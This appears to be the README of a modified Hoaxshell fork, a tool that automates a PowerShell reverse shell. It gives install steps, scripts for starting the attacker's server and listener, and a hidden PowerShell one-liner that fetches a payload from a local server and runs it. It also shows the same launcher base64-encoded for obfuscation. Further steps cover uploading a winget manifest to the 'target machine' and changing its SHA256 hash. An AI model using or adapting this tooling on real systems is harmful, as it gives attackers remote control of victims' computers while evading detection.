# sp-hoaxshell
Copy of the real Hoaxshell (https://github.com/t3l3machus/hoaxshell) with modifications to automatise everything
& see : https://github.com/SentinelSamuel/sp-hoaxshell


## Installation + configuration before the start
```
sudo git clone https://github.com/t3l3machus/hoaxshell.git
sudo rm ./hoaxshell/hoaxshell.py
sudo git clone https://github.com/SentinelSamuel/sp-hoaxshell.git
sudo mv ./sp-hoaxshell/hoaxshell.py ./hoaxshell
sudo mv ./sp-hoaxshell/sp-hoax/ ./
sudo rm -rf ./sp-hoaxshell
sudo pip3 install -r ./hoaxshell/requirements.txt
sudo chmod +x ./hoaxshell/hoaxshell.py
cd sp-hoax/
```

### 1) Start Python server
```
# maybe a sudo before ?
bash python-server-1.sh
```
### 2) Start hoaxshell
```
# IN ANOTHER BASH PROMPT
# maybe a sudo before ?
bash hoaxshell-2.sh  
```
### 3) Make the info file correct
```
# IN ANOTHER BASH PROMPT
# maybe a sudo before ?
pwsh info-3.ps1
```


## Some infos :
```
# Not encoded :
$e=Invoke-RestMethod -Uri "http://10.1.1.3:70/sp-hoax/info"; powershell -WindowStyle hidden -e $e
```
```
# Encoded with this :
$text='<Your commands>'
$encoded=[convert]::ToBase64String([Text.Encoding]::Unicode.getBytes($text))
$encoded
```
```
# Encoded & used in the scripts to reverse-shell the targeted machine
powershell -WindowStyle hidden -e "JABlAD0ASQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwAxADAALgAxAC4AMQAuADMAOgA3ADAALwBzAHAALQBoAG8AYQB4AC8AaQBuAGYAbwAiADsAIABwAG8AdwBlAHIAcwBoAGUAbABsACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABoAGkAZABkAGUAbgAgAC0AZQAgACQAZQA="
```

## AFTER INSTALLING AND DOING EVERYTHING IN THE sp-hoaxshell
Winget.ps1 & winget-manifest.yml --> upload on the target machine

## Installation & configuration before the start :
```
git clone https://github.com/SentinelSamuel/sp-winget-RS-hoax.git
cd ./sp-winget-RS-hoax/winget
``` 

### 4) Start Sha256 changer
```
sudo bash change-sha256.sh
```
